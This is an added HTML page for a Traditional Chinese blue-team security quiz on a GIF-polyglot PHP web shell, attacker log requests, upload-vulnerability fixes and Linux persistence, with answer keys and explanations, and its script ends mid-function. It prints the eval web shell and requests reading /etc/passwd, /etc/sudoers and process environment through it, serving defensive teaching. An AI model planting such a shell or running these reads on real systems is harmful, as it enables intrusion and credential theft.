@@ -1,0 +1,846 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>資安題組實戰：WebShell 與 持久化機制分析</title>
+    
+    <!-- External Resources with Integrity -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet" xintegrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" xintegrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <style>
+        :root {
+            --primary-color: #2980b9;
+            --success-bg: #e8f5e9;
+            --success-text: #2e7d32;
+            --error-bg: #fce4ec;
+            --error-text: #c62828;
+            --highlight-color: #f1c40f;
+            --text-main: #2c3e50;
+            --bg-body: #f4f6f9;
+        }
+
+        body {
+            font-family: system-ui, "Noto Sans TC", sans-serif;
+            background-color: var(--bg-body);
+            color: var(--text-main);
+            line-height: 1.6;
+        }
+
+        /* Container Layout */
+        .page-container {
+            max-width: 960px;
+            width: 100%;
+            margin: 40px auto;
+            padding: 40px;
+            background-color: #ffffff;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            border-radius: 16px;
+        }
+
+        @media (max-width: 768px) {
+            .page-container {
+                margin: 16px;
+                padding: 20px;
+                width: calc(100% - 32px);
+            }
+        }
+
+        /* Header & Progress */
+        .quiz-header {
+            margin-bottom: 30px;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 20px;
+        }
+
+        .progress {
+            height: 10px;
+            background-color: #e9ecef;
+            border-radius: 5px;
+            margin-top: 15px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            background-color: var(--primary-color);
+            transition: width 0.6s ease;
+        }
+
+        /* Context Card */
+        .context-card {
+            background-color: #f8f9fa;
+            border-left: 5px solid var(--primary-color);
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+        }
+
+        .file-preview {
+            background-color: #2d3436;
+            color: #dfe6e9;
+            padding: 15px;
+            border-radius: 6px;
+            font-family: 'Courier New', Courier, monospace;
+            margin-top: 10px;
+            border: 1px solid #636e72;
+        }
+
+        /* Tabs */
+        .nav-tabs {
+            border-bottom: 2px solid #dee2e6;
+            margin-bottom: 25px;
+            gap: 5px;
+        }
+
+        .nav-link {
+            border: none;
+            color: #6c757d;
+            font-weight: 500;
+            padding: 12px 20px;
+            border-radius: 8px 8px 0 0 !important;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .nav-link:hover {
+            color: var(--primary-color);
+            background-color: rgba(41, 128, 185, 0.05);
+            transform: translateY(-2px);
+        }
+
+        .nav-link.active {
+            color: var(--primary-color) !important;
+            border-bottom: 3px solid var(--primary-color) !important;
+            background-color: transparent !important;
+            font-weight: 700;
+        }
+
+        .tab-status-icon {
+            font-size: 0.85em;
+        }
+
+        /* Question Area */
+        .question-badge {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            margin-bottom: 15px;
+            display: inline-block;
+        }
+
+        .question-text {
+            font-size: 1.25rem;
+            font-weight: 600;
+            margin-bottom: 25px;
+        }
+
+        .highlight-negative {
+            color: #c62828;
+            font-weight: 800;
+            text-decoration: underline;
+            text-decoration-thickness: 2px;
+        }
+
+        /* Options */
+        .option-card {
+            border: 2px solid #e9ecef;
+            border-radius: 10px;
+            padding: 15px 20px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+            display: flex;
+            align-items: flex-start;
+        }
+
+        .option-card:hover:not(.disabled) {
+            background-color: #e3f2fd;
+            transform: translateX(5px);
+        }
+
+        .option-card.selected {
+            border-color: var(--primary-color);
+            background-color: #e3f2fd;
+        }
+
+        .option-card.disabled {
+            cursor: not-allowed;
+            opacity: 0.8;
+        }
+
+        .option-input {
+            margin-top: 5px;
+            margin-right: 12px;
+            accent-color: var(--primary-color);
+        }
+
+        .option-text {
+            width: 100%;
+            word-break: break-word;
+        }
+
+        /* Feedback Area */
+        .feedback-area {
+            margin-top: 25px;
+            display: none;
+            animation: fadeInUp 0.3s ease;
+        }
+
+        .alert-feedback {
+            border-radius: 10px;
+            padding: 20px;
+            border: none;
+        }
+
+        .alert-success-custom {
+            background-color: var(--success-bg);
+            color: var(--success-text);
+            border-left: 5px solid var(--success-text);
+        }
+
+        .alert-error-custom {
+            background-color: var(--error-bg);
+            color: var(--error-text);
+            border-left: 5px solid var(--error-text);
+        }
+
+        /* Explanation Detailed Sections */
+        .explanation-card {
+            background-color: #f8f9fa;
+            border-left: 4px solid var(--primary-color);
+            padding: 20px;
+            margin-top: 15px;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .exp-section {
+            margin-bottom: 20px;
+        }
+        
+        .exp-header {
+            font-weight: 700;
+            color: #2c3e50;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            font-size: 1.05rem;
+        }
+
+        .exp-header i {
+            color: var(--primary-color);
+            margin-right: 8px;
+            width: 20px;
+            text-align: center;
+        }
+
+        .exp-content {
+            padding-left: 28px;
+            color: #4a5568;
+            font-size: 0.95rem;
+        }
+
+        .keyword-tag {
+            background-color: #e1f5fe;
+            color: #0277bd;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 0.9em;
+            margin-right: 5px;
+            border: 1px solid #b3e5fc;
+        }
+
+        .golden-rule-box {
+            background-color: #fff3e0;
+            border: 1px dashed #ffa726;
+            padding: 15px;
+            border-radius: 8px;
+            color: #e65100;
+            font-weight: 600;
+            text-align: center;
+            margin: 15px 0;
+        }
+
+        .trap-box {
+            background-color: #ffebee;
+            border-left: 3px solid #ef5350;
+            padding: 10px 15px;
+            color: #c62828;
+            border-radius: 0 4px 4px 0;
+        }
+
+        /* Self Check specific styles */
+        .self-check-container {
+            background-color: #fff;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 10px;
+        }
+
+        .self-check-item {
+            margin-bottom: 12px;
+            border-bottom: 1px solid #f1f1f1;
+            padding-bottom: 12px;
+        }
+
+        .self-check-item:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .self-check-q {
+            font-weight: 600;
+            color: #2d3748;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: flex-start;
+        }
+        
+        .self-check-q::before {
+            content: "Q.";
+            color: var(--primary-color);
+            font-weight: 800;
+            margin-right: 8px;
+            min-width: 20px;
+        }
+
+        /* Buttons */
+        .btn-action {
+            padding: 10px 24px;
+            border-radius: 8px;
+            font-weight: 600;
+            transition: all 0.2s;
+            min-height: 44px;
+        }
+
+        .btn-action:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+
+        /* Animations */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Tags */
+        .tag-sec { background-color: #c0392b; color: white; padding: 2px 8px; border-radius: 4px; font-size: 0.75rem; vertical-align: middle; }
+    </style>
+</head>
+<body>
+
+<div class="page-container">
+    <!-- Header -->
+    <div class="quiz-header">
+        <div class="d-flex justify-content-between align-items-center flex-wrap gap-2">
+            <div>
+                <h2 class="mb-0 fw-bold"><i class="fas fa-shield-virus me-2 text-primary"></i>WebShell 與持久化機制分析</h2>
+                <div class="text-muted small mt-1">題組：33-36_group4_gif_polyglot</div>
+            </div>
+            <div class="text-end">
+                <span class="badge bg-secondary rounded-pill" id="progress-text">已完成 0/4</span>
+            </div>
+        </div>
+        <div class="progress">
+            <div class="progress-bar" id="main-progress" role="progressbar" style="width: 0%"></div>
+        </div>
+    </div>
+
+    <!-- Global Context -->
+    <div class="context-card">
+        <h5 class="fw-bold"><i class="fas fa-info-circle me-2"></i>情境描述</h5>
+        <p class="mb-2">你是一位企業的藍隊防禦專家，目前企業正在進行紅隊演練。你忽然收到來自 EDR 的告警，顯示昨天某台伺服器已經被攻擊者取得控制權，因此你開始對該伺服器的可疑檔案與背後的攻擊行動展開調查。</p>
+        <p class="mb-0"><strong>附圖 1（你在網頁目錄發現的 index2.php 內容）：</strong></p>
+        <div class="file-preview">
+            <span style="color: #ff7675;">GIF89a</span>&#x00;...&#xFF;&#xD9;...<br>
+            <span style="color: #74b9ff;">&lt;?php</span> <span style="color: #fab1a0;">@eval</span>(<span style="color: #55efc4;">$_REQUEST</span>["<span style="color: #ffeaa7;">input</span>"]); <span style="color: #74b9ff;">exit;?&gt;</span>
+        </div>
+    </div>
+
+    <!-- Tabs -->
+    <ul class="nav nav-tabs" id="quizTabs" role="tablist">
+        <!-- Rendered by JS -->
+    </ul>
+
+    <!-- Tab Content -->
+    <div class="tab-content" id="quizTabContent">
+        <!-- Rendered by JS -->
+    </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js" xintegrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz" crossorigin="anonymous"></script>
+
+<script>
+    // --- Quiz Data ---
+    const quizData = {
+        groupName: "WebShell 與持久化機制分析",
+        questions: [
+            {
+                id: 33,
+                type: "single",
+                question: "你登入那台被入侵的伺服器之後，在網頁目錄中發現一個沒看過的檔案 <code>index2.php</code>，檔案內容如上方情境所示。請問下列何項描述<span class='highlight-negative'>錯誤</span>？",
+                options: [
+                    { id: "A", text: "GIF89a 是 GIF 圖片的檔頭 (File Header)" },
+                    { id: "B", text: "這是一張 GIF 圖片，如果在作業系統裡面點擊圖片檔案的話，圖片顯示的內容是「input」" },
+                    { id: "C", text: "這個檔案可能被伺服器誤以為是一個圖檔，因此允許使用者上傳到目錄中，但其中包含一段 PHP 程式碼，可能會造成威脅" },
+                    { id: "D", text: "這個檔案就是常見的一句話木馬，可以用來執行 PHP 程式碼，攻擊者通常會用來控制伺服器" }
+                ],
+                correctAnswer: ["B"],
+                reason: "該檔案本質是夾帶 PHP 代碼的惡意檔案，並非正常圖片，OS 開啟結果不可預測且不會顯示「input」。",
+                detail: {
+                    keywords: ["index2.php (.php)", "GIF89a", "@eval($_REQUEST['input'])", "描述「錯誤」"],
+                    translation: "你發現一個看起來像 GIF 圖片、但其實裡面塞了 PHP 指令的檔案。題目要你判斷：哪一句話講錯了。",
+                    logic: `
+                        <ol>
+                            <li><strong>判斷性質：</strong>副檔名是 <code>.php</code>，且內容有 <code>&lt;?php ... ?&gt;</code>，代表伺服器會將其作為 PHP 程式執行。</li>
+                            <li><strong>識別偽裝：</strong><code>GIF89a</code> 是檔頭（Magic Number），目的是為了騙過「只檢查檔頭」的上傳過濾機制。</li>
+                            <li><strong>識別威脅：</strong><code>eval()</code> 是危險函數，會將接收到的字串當作程式碼執行，即所謂的「一句話木馬」。</li>
+                            <li><strong>生活例子：</strong>把「毒藥」裝在「飲料瓶」裡，瓶身標籤寫果汁（GIF89a），但你真正喝下去的是毒藥（PHP eval）。</li>
+                        </ol>`,
+                    optionAnalysis: `
+                        <ul>
+                            <li>(A) <strong>對</strong>：GIF89a 的確是 GIF 的標準檔頭。</li>
+                            <li>(B) <strong>錯</strong>：檔案本質是 PHP。即使有檔頭，它也不是合法的 GIF 圖片資料流。OS 開啟可能會報錯或顯示亂碼，絕對不會顯示變數名稱「input」。</li>
+                            <li>(C) <strong>對</strong>：這就是 Polyglot（多態檔案）攻擊，利用圖檔偽裝上傳，再利用 PHP 解析執行。</li>
+                            <li>(D) <strong>對</strong>：符合 WebShell 一句話木馬的特徵。</li>
+                        </ul>`,
+                    supplement: "<strong>Web Shell (網站木馬)：</strong>藏在網站上的後門程式，讓攻擊者能遠端下指令。<br><strong>Polyglot File (多態檔案)：</strong>同一份檔案同時具備多種格式特徵（如既像 GIF 又像 PHP），專門用來繞過檢查。",
+                    mnemonic: "GIF 開頭不等於 GIF，看到 eval 先當後門。",
+                    trap: "<strong>心理盲點：</strong>看到 GIF89a 就直覺以為它是「正常的圖片」。<br><strong>避坑指南：</strong>同時出現「圖片檔頭 + PHP 標籤/eval」時，立刻判斷為「偽裝上傳 + Web Shell」。",
+                    selfCheck: [
+                        { q: "若把檔名改成 index2.gif，但伺服器設定「會解析 .gif 內的 PHP」會怎樣？", a: "仍可能變成後門，因為關鍵在「伺服器是否會解譯其中的 PHP」，不是檔名看起來像不像圖片。" },
+                        { q: "看到 <code>eval($_REQUEST['input'])</code>，攻擊者最常用它做什麼？", a: "遠端下指令 (RCE)、執行系統命令、寫入其他後門。" },
+                        { q: "只檢查副檔名與只檢查檔頭，各自會被怎麼繞過？", a: "只檢副檔名：攻擊者把 .php 改名 .gif；只檢檔頭：攻擊者在檔案開頭塞 GIF89a 偽裝。" }
+                    ]
+                }
+            },
+            {
+                id: 34,
+                type: "single",
+                question: "承上題，你在 log 中發現好幾個可疑內容，請問下列哪一個 log 的推論最有可能是<span class='highlight-negative'>錯誤</span>的？",
+                options: [
+                    { id: "A", text: "<code>/index2.php?input=phpinfo();</code> → 想用 phpinfo 取得系統資訊" },
+                    { id: "B", text: "<code>/index2.php?input=system('cat /etc/passwd');</code> → 想知道每個使用者的明文密碼內容" },
+                    { id: "C", text: "<code>/index2.php?input=system('cat /etc/sudoers');</code> → 想知道哪些帳號可提權 root" },
+                    { id: "D", text: "<code>/index2.php?input=system('cat /proc/self/environ');</code> → 想知道目前 process 的環境變數" }
+                ],
+                correctAnswer: ["B"],
+                reason: "Linux 的 /etc/passwd 檔案僅包含使用者帳號資訊，密碼雜湊通常存在於 /etc/shadow（需 root 權限）。",
+                detail: {
+                    keywords: ["input=phpinfo()", "system('cat ...')", "/etc/passwd", "/etc/shadow", "錯誤推論"],
+                    translation: "攻擊者用這個後門網址下指令。題目要你判斷：哪個「推論」最不合理、最像在亂講。",
+                    logic: `
+                        <ol>
+                            <li><strong>確認行為：</strong>URL 參數 <code>input</code> 會被傳入 <code>system()</code> 執行，這是標準的命令注入攻擊。</li>
+                            <li><strong>檔案識別：</strong>
+                                <ul>
+                                    <li><code>/etc/passwd</code>：使用者帳號列表（公開可讀）。</li>
+                                    <li><code>/etc/shadow</code>：密碼雜湊檔（僅 root 可讀）。</li>
+                                    <li><code>/etc/sudoers</code>：Sudo 權限設定檔。</li>
+                                    <li><code>/proc/self/environ</code>：當前進程環境變數。</li>
+                                </ul>
+                            </li>
+                            <li><strong>生活例子：</strong>passwd 像「員工通訊錄」（大家都能看），shadow 才是「保險箱裡的密碼本」（只有老闆能看）。</li>
+                        </ol>`,
+                    optionAnalysis: `
+                        <ul>
+                            <li>(A) <strong>對</strong>：<code>phpinfo()</code> 會輸出詳細的環境與模組資訊，是偵察首選。</li>
+                            <li>(B) <strong>錯</strong>：<code>/etc/passwd</code> 不包含「明文密碼」，甚至現代 Linux 也不含雜湊值（Hash）。推論「想知道明文密碼」是技術觀念錯誤。</li>
+                            <li>(C) <strong>對</strong>：讀取 <code>sudoers</code> 是為了尋找提權路徑。</li>
+                            <li>(D) <strong>對</strong>：<code>environ</code> 可能洩漏 API Key 或 Token。</li>
+                        </ul>`,
+                    supplement: "<strong>/etc/passwd vs /etc/shadow：</strong><br>passwd 存帳號 Shell、家目錄等資訊；Shadow 存加密後的密碼 Hash。因為權限分離原則，一般 Web User (如 www-data) 通常讀不到 Shadow。",
+                    mnemonic: "名冊 passwd，密碼 shadow；提權看 sudoers，祕密看 environ。",
+                    trap: "<strong>陷阱：</strong>把 /etc/passwd 誤認為存明文密碼（這是古老系統或初學者的誤區）。<br><strong>避坑指南：</strong>考到 passwd 就同時想到 shadow，考到提權就想到 sudoers。",
+                    selfCheck: [
+                        { q: "真正可能含密碼雜湊的檔案是哪個？為什麼一般使用者看不到？", a: "<code>/etc/shadow</code>；因為權限設定為僅 root 可讀，避免一般使用者取得雜湊進行離線破解。" },
+                        { q: "environ 可能洩漏哪些類型敏感資訊？請舉兩種。", a: "API Key、Access Token、資料庫連線字串、雲端憑證路徑等。" }
+                    ]
+                }
+            },
+            {
+                id: 35,
+                type: "single",
+                question: "你判斷系統有任意檔案上傳漏洞，提供修補建議。下列何項建議對於修補此漏洞最<span class='highlight-negative'>不</span>適切？",
+                options: [
+                    { id: "A", text: "限制副檔名，並將檔案移到指定目錄" },
+                    { id: "B", text: "上傳圖片做破壞性轉檔，讓潛藏惡意碼失效" },
+                    { id: "C", text: "透過前端限制不可上傳 GIF，只要檔名有 .gif 就不讓上傳" },
+                    { id: "D", text: "Web 目錄設定為不可執行檔案" }
+                ],
+                correctAnswer: ["C"],
+                reason: "前端檢查（JavaScript/HTML）可輕易被攻擊者透過攔截封包或停用 JS 繞過，無法提供實質保護。",
+                detail: {
+                    keywords: ["任意檔案上傳", "最不適切", "前端限制", ".gif"],
+                    translation: "你要修的是「上傳功能被拿來丟後門」。哪個建議最爛、最容易被攻擊者一句話繞過？",
+                    logic: `
+                        <ol>
+                            <li><strong>防禦原則：</strong>所有來自客戶端的資料都是不可信的。</li>
+                            <li><strong>前端檢查無效性：</strong>瀏覽器的 JS 檢查只是為了使用者體驗 (UX)，攻擊者可以使用 Burp Suite 等工具直接修改 HTTP 封包，繞過前端限制。</li>
+                            <li><strong>縱深防禦：</strong>伺服器端檢查 (白名單) + 儲存隔離 (移出 Web Root) + 行為破壞 (轉檔) 才是有效組合。</li>
+                        </ol>`,
+                    optionAnalysis: `
+                        <ul>
+                            <li>(A) <strong>適切</strong>：伺服器端白名單 + 目錄隔離，是標準防禦。</li>
+                            <li>(B) <strong>適切</strong>：破壞性轉檔（如重新編碼）能破壞夾帶的惡意 Payload 結構。</li>
+                            <li>(C) <strong>最不適切</strong>：只靠前端、只看檔名，完全無法防禦有心的攻擊者。</li>
+                            <li>(D) <strong>適切</strong>：設定目錄 NoExec (不可執行) 能直接阻斷 WebShell 運作。</li>
+                        </ul>`,
+                    supplement: "<strong>完整防禦組合：</strong><br>1) 伺服器端白名單 (MIME + Magic Number + 副檔名)<br>2) 隨機重命名<br>3) 存放於 Web Root 之外<br>4) 權限設為不可執行 (chmod -x)",
+                    mnemonic: "前端不算數，後端才作主；能執行就完蛋，隔離最靠譜。",
+                    trap: "<strong>盲點：</strong>以為「使用者無法在網頁上點選」就等於「無法上傳」。忽略了攻擊者不一定透過瀏覽器操作。",
+                    selfCheck: [
+                        { q: "為什麼「只檢 MIME Type」也不可靠？", a: "因為 MIME Type (Content-Type header) 是由客戶端發送的，攻擊者可以輕易偽造為 `image/jpeg` 但上傳 PHP 檔。" },
+                        { q: "最推薦把上傳檔放在哪裡？為什麼？", a: "放在 Web Root 之外 (使用者無法透過 URL 直接存取)，或雲端儲存桶 (S3)，徹底杜絕直接執行的可能性。" }
+                    ]
+                }
+            },
+            {
+                id: 36,
+                type: "multi",
+                question: "你移除檔案後仍有人在執行攻擊指令，你推測紅隊已做維持權限（Persistence）的動作。以下哪些是維持權限技巧？（複選）",
+                options: [
+                    { id: "A", text: "使用 nc，輸入 <code>nc 127.0.0.1 22</code> 就可以建立後門" },
+                    { id: "B", text: "把 SSH 登入金鑰寫入 <code>~/.ssh/known_hosts</code>，以便可以使用 SSH 登入" },
+                    { id: "C", text: "把反向連線指令寫入 <code>~/.bashrc</code>，使用者一登入就觸發反向連線" },
+                    { id: "D", text: "把指令寫入 <code>crontab</code>，每小時定期執行反向連線程式" }
+                ],
+                correctAnswer: ["C", "D"],
+                reason: "Bashrc 會在登入時執行，Crontab 會定期執行，兩者皆具備「自動觸發」的持久化特性。",
+                detail: {
+                    keywords: ["維持權限 (Persistence)", "~/.bashrc", "crontab", "自動執行"],
+                    translation: "紅隊已經進來過了，你把後門檔刪掉，但他們還能繼續下指令，表示系統裡可能被埋了「自動回來的機關」。題目要你選哪些方法最像這種機關。",
+                    logic: `
+                        <ol>
+                            <li><strong>定義持久化：</strong>關鍵在於「被刪除後能否自動恢復」或「不需要漏洞能否再次進入」。通常依賴系統的自動執行機制。</li>
+                            <li><strong>機制分析：</strong>
+                                <ul>
+                                    <li><code>.bashrc</code>：使用者開啟 Shell 或登入時自動執行 → 符合。</li>
+                                    <li><code>crontab</code>：時間到自動執行 → 符合。</li>
+                                </ul>
+                            </li>
+                        </ol>`,
+                    optionAnalysis: `
+                        <ul>
+                            <li>(A) <strong>錯</strong>：<code>nc 127.0.0.1 22</code> 只是連線到本機 SSH 服務，不是建立後門。建立後門通常是開啟監聽 (Listen) 或反向連線 (Reverse Shell)。</li>
+                            <li>(B) <strong>錯</strong>：<code>known_hosts</code> 是存「我連過誰」，<code>authorized_keys</code> 才是存「誰能連我」。放錯檔案無效。</li>
+                            <li>(C) <strong>對</strong>：登入觸發反向連線，典型持久化。</li>
+                            <li>(D) <strong>對</strong>：排程反向連線，典型持久化。</li>
+                        </ul>`,
+                    supplement: "<strong>常見 Linux 持久化路徑：</strong><br>1. 排程：Cron, Systemd Timers<br>2. 開機/登入：rc.local, .bashrc, .profile, init.d, systemd services<br>3. 帳號：新增 Sudoer, SSH authorized_keys",
+                    mnemonic: "登入看 rc，定時看 cron；host 只是名單，keys 才能開門。",
+                    trap: "<strong>混淆：</strong>把 <code>known_hosts</code> (指紋清單) 當成 <code>authorized_keys</code> (授權清單)。<br><strong>誤解：</strong>把 nc 的「連線行為」誤以為是「植入後門程式」。",
+                    selfCheck: [
+                        { q: "若攻擊者把公鑰放進 <code>~/.ssh/authorized_keys</code>，屬不屬於持久化？為什麼？", a: "屬於。因為之後攻擊者可直接用對應私鑰 SSH 登入，不需依賴原本的 Web 漏洞，達到了長期控制的目的。" },
+                        { q: "你要檢查哪些位置，最容易找到 Linux 的持久化設定？請列 3 個。", a: "<code>~/.bashrc</code>、<code>/etc/crontab</code> (或 <code>/var/spool/cron/</code>)、<code>/etc/systemd/system/</code>。" }
+                    ]
+                }
+            }
+        ]
+    };
+
+    // --- State Management ---
+    let quizState = {}; // { 33: { status: 'unanswered', userAnswer: [] } }
+
+    // --- Initialization ---
+    document.addEventListener('DOMContentLoaded', () => {
+        initQuiz();
+    });
+
+    function initQuiz() {
+        const tabsContainer = document.getElementById('quizTabs');
+        const contentContainer = document.getElementById('quizTabContent');
+
+        quizData.questions.forEach((q, index) => {
+            // Initialize State
+            quizState[q.id] = { status: 'unanswered', userAnswer: [] };
+
+            // 1. Create Tab
+            const isActive = index === 0 ? 'active' : '';
+            const tabHTML = `
+                <li class="nav-item" role="presentation">
+                    <button class="nav-link ${isActive}" id="tab-${q.id}" data-bs-toggle="tab" data-bs-target="#content-${q.id}" type="button" role="tab" aria-controls="content-${q.id}" aria-selected="${index === 0}">
+                        第 ${q.id} 題
+                        <span id="status-icon-${q.id}" class="tab-status-icon ms-1"></span>
+                    </button>
+                </li>
+            `;
+            tabsContainer.insertAdjacentHTML('beforeend', tabHTML);
+
+            // 2. Create Content
+            // Shuffle Options
+            const shuffledOptions = shuffleArray([...q.options]);
+            const inputType = q.type === 'multi' ? 'checkbox' : 'radio';
+            
+            // Generate Keywords HTML
+            const keywordsHTML = q.detail.keywords.map(k => `<span class="keyword-tag">${k}</span>`).join('');
+            
+            // Generate Self Check HTML
+            const selfCheckHTML = q.detail.selfCheck.map((item, idx) => `
+                <div class="self-check-item">
+                    <div class="self-check-q">${item.q}</div>
+                    <details class="ms-4">
+                        <summary class="text-primary fw-bold" style="cursor:pointer; font-size:0.9em; list-style:none;">
+                            <i class="fas fa-eye me-1"></i>顯示答案參考
+                        </summary>
+                        <div class="p-2 bg-light rounded mt-2 text-dark border-start border-3 border-success">
+                            ${item.a}
+                        </div>
+                    </details>
+                </div>
+            `).join('');
+
+            const contentHTML = `
+                <div class="tab-pane fade ${index === 0 ? 'show active' : ''}" id="content-${q.id}" role="tabpanel" aria-labelledby="tab-${q.id}">
+                    <div class="mb-3">
+                        <span class="tag-sec me-2">Web Security</span>
+                        <span class="question-badge">${q.type === 'multi' ? '複選題' : '單選題'}</span>
+                    </div>
+                    
+                    <h4 class="question-text">${q.question}</h4>
+
+                    <div class="options-container" id="options-container-${q.id}">
+                        ${shuffledOptions.map(opt => `
+                            <label class="option-card" id="option-label-${q.id}-${opt.id}">
+                                <input type="${inputType}" name="q${q.id}" class="option-input" value="${opt.id}" onchange="handleOptionSelect(${q.id}, '${opt.id}', '${q.type}')">
+                                <span class="option-text">
+                                    <span class="fw-bold me-2">(${opt.id})</span>${opt.text}
+                                </span>
+                            </label>
+                        `).join('')}
+                    </div>
+
+                    <div class="mt-4 d-flex gap-2">
+                        <button class="btn btn-primary btn-action text-white" id="submit-${q.id}" onclick="submitAnswer(${q.id})" disabled>
+                            <i class="fas fa-paper-plane me-2"></i>送出答案
+                        </button>
+                        <button class="btn btn-outline-secondary btn-action" id="reset-${q.id}" onclick="resetQuestion(${q.id})" style="display:none;">
+                            <i class="fas fa-redo me-2"></i>重新挑戰
+                        </button>
+                    </div>
+
+                    <!-- Feedback Section -->
+                    <div id="feedback-${q.id}" class="feedback-area">
+                        <div class="alert alert-feedback" id="feedback-alert-${q.id}">
+                            <h5 class="fw-bold" id="feedback-title-${q.id}"></h5>
+                            <p class="mb-0" id="feedback-reason-${q.id}"></p>
+                        </div>
+                        
+                        <details class="mt-3" open>
+                            <summary class="btn btn-link text-decoration-none px-0 fw-bold fs-5">
+                                <i class="fas fa-lightbulb me-1"></i>深度解析與觀念拆解
+                            </summary>
+                            <div class="explanation-card">
+                                
+                                <!-- Step 1: Keywords -->
+                                <div class="exp-section">
+                                    <div class="exp-header"><i class="fas fa-search"></i>第一步：找關鍵字</div>
+                                    <div class="exp-content">${keywordsHTML}</div>
+                                </div>
+
+                                <!-- Step 2: Translation -->
+                                <div class="exp-section">
+                                    <div class="exp-header"><i class="fas fa-language"></i>第二步：白話翻譯</div>
+                                    <div class="exp-content">${q.detail.translation}</div>
+                                </div>
+
+                                <!-- Step 3: Logic -->
+                                <div class="exp-section">
+                                    <div class="exp-header"><i class="fas fa-brain"></i>第三步：解題思路與原理</div>
+                                    <div class="exp-content">${q.detail.logic}</div>
+                                </div>
+
+                                <!-- Step 4: Options -->
+                                <div class="exp-section">
+                                    <div class="exp-header"><i class="fas fa-list-ul"></i>第四步：選項分析</div>
+                                    <div class="exp-content">${q.detail.optionAnalysis}</div>
+                                </div>
+
+                                <!-- Supplement -->
+                                <div class="exp-section">
+                                    <div class="exp-header"><i class="fas fa-book-medical"></i>觀念補充與延伸</div>
+                                    <div class="exp-content">${q.detail.supplement}</div>
+                                </div>
+
+                                <!-- Mnemonic -->
+                                <div class="golden-rule-box">
+                                    <i class="fas fa-star me-2"></i>記憶口訣：${q.detail.mnemonic}
+                                </div>
+
+                                <!-- Trap -->
+                                <div class="exp-section">
+                                    <div class="exp-header"><i class="fas fa-exclamation-triangle"></i>常見陷阱與避坑</div>
+                                    <div class="trap-box">${q.detail.trap}</div>
+                                </div>
+
+                                <!-- Self Check -->
+                                <div class="exp-section mt-4">
+                                    <div class="exp-header text-primary"><i class="fas fa-clipboard-check"></i>自我檢測 (點擊顯示答案)</div>
+                                    <div class="self-check-container">
+                                        ${selfCheckHTML}
+                                    </div>
+                                </div>
+
+                            </div>
+                        </details>
+                    </div>
+                </div>
+            `;
+            contentContainer.insertAdjacentHTML('beforeend', contentHTML);
+        });
+
+        updateProgress();
+    }
+
+    // --- Logic Functions ---
+
+    function shuffleArray(array) {
+        for (let i = array.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [array[i], array[j]] = [array[j], array[i]];
+        }
+        return array;
+    }
+
+    function handleOptionSelect(qId, optId, type) {
+        if (quizState[qId].status !== 'unanswered') return; // Prevent change after submit
+
+        const submitBtn = document.getElementById(`submit-${qId}`);
+        const currentAnswers = quizState[qId].userAnswer;
+
+        if (type === 'single') {
+            quizState[qId].userAnswer = [optId];
+            // Visual Update
+            document.querySelectorAll(`#options-container-${qId} .option-card`).forEach(el => el.classList.remove('selected'));
+            document.getElementById(`option-label-${qId}-${optId}`).classList.add('selected');
+        } else {
+            // Multi
+            if (currentAnswers.includes(optId)) {
+                quizState[qId].userAnswer = currentAnswers.filter(id => id !== optId);
+                document.getElementById(`option-label-${qId}-${optId}`).classList.remove('selected');
+            } else {
+                quizState[qId].userAnswer.push(optId);
+                document.getElementById(`option-label-${qId}-${optId}`).classList.add('selected');
+            }
+        }
+
+        submitBtn.disabled = quizState[qId].userAnswer.length === 0;
+    }
+
+    function submitAnswer(qId) {
+        const qData = quizData.questions.find(q => q.id === qId);
+        const userAns = quizState[qId].userAnswer.sort();
+        const correctAns = qData.correctAnswer.sort();
+
+        // Check Answer
+        const isCorrect = JSON.stringify(userAns) === JSON.stringify(correctAns);
+        quizState[qId].status = isCorrect ? 'correct' : 'incorrect';
+
+        // Update UI
+        showFeedback(qId, isCorrect, qData);
+        lockOptions(qId);
+        updateTabStatus(qId, isCorrect);
+        
+        // Buttons
+        document.getElementById(`submit-${qId}`).style.display = 'none';
+        document.getElementById(`reset-${qId}`).style.display = 'inline-block';
+
+        updateProgress();
+        
+        // Scroll to feedback
+        setTimeout(() => {
+             document.getElementById(`feedback-${qId}`).scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }, 100);
+    }
+
+    function showFeedback(qId, isCorrect, qData) {
